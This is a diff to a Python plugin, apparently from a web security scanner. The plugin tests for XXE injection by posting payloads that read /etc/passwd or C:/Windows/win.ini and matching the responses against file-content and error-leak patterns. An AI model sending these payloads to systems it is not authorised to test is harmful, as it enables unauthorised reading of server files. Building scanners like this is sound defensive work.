@@ -16,11 +16,28 @@ XXE_PAYLOAD = (
     '<root>&xxe;</root>'
 )
 
+XXE_PAYLOAD_WINDOWS = (
+    '<?xml version="1.0"?>'
+    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
+    '<root>&xxe;</root>'
+)
+
+PAYLOADS = [XXE_PAYLOAD, XXE_PAYLOAD_WINDOWS]
+
 # Indicators that XXE was processed (file read succeeded or XML error leaks info)
 DETECTION_PATTERNS = [
     "root:x:0:0:",          # Linux /etc/passwd content
     "daemon:x:",
     "nobody:x:",
+    "[fonts]",              # Windows win.ini content
+    "[extensions]",
+    "for 16-bit app support",
+    # XML parser error leakage patterns
+    "DOCTYPE",
+    "ENTITY",
+    "XML parser error",
+    "XML declaration",
+    "not well-formed",
 ]
 
 
@@ -40,38 +57,39 @@ class XxePlugin(PluginBase):
         headers = {"Content-Type": "application/xml"}
 
         async with httpx.AsyncClient(verify=target.verify_ssl, timeout=10) as client:
-            try:
-                resp = await client.post(
-                    target.url,
-                    content=XXE_PAYLOAD.encode(),
-                    headers=headers,
-                )
-            except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
-                return []
-
-            if len(resp.text) > 1_000_000:
-                return []
-
-            for marker in DETECTION_PATTERNS:
-                if marker in resp.text:
-                    curl_cmd = (
-                        f"curl -X POST {shlex.quote(target.url)} "
-                        f"-H 'Content-Type: application/xml' "
-                        f"-d {shlex.quote(XXE_PAYLOAD)}"
+            for payload in PAYLOADS:
+                try:
+                    resp = await client.post(
+                        target.url,
+                        content=payload.encode(),
+                        headers=headers,
                     )
-                    return [Result(
-                        plugin_name=self.name,
-                        base_severity=self.base_severity,
-                        title="XML External Entity (XXE) Injection",
-                        description=(
-                            "The server processed an XXE payload and returned "
-                            "the contents of /etc/passwd in the response."
-                        ),
-                        evidence=f"Response contains: {marker!r}",
-                        cwe_id="CWE-611",
-                        endpoint=target.url,
-                        curl_command=curl_cmd,
-                        rule_id="xxe_entity_injection",
-                    )]
+                except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
+                    return []
+
+                if len(resp.text) > 1_000_000:
+                    continue
+
+                for marker in DETECTION_PATTERNS:
+                    if marker in resp.text:
+                        curl_cmd = (
+                            f"curl -X POST {shlex.quote(target.url)} "
+                            f"-H 'Content-Type: application/xml' "
+                            f"-d {shlex.quote(payload)}"
+                        )
+                        return [Result(
+                            plugin_name=self.name,
+                            base_severity=self.base_severity,
+                            title="XML External Entity (XXE) Injection",
+                            description=(
+                                "The server processed an XXE payload and returned "
+                                "file contents or XML error details in the response."
+                            ),
+                            evidence=f"Response contains: {marker!r}",
+                            cwe_id="CWE-611",
+                            endpoint=target.url,
+                            curl_command=curl_cmd,
+                            rule_id="xxe_entity_injection",
+                        )]
 
         return []
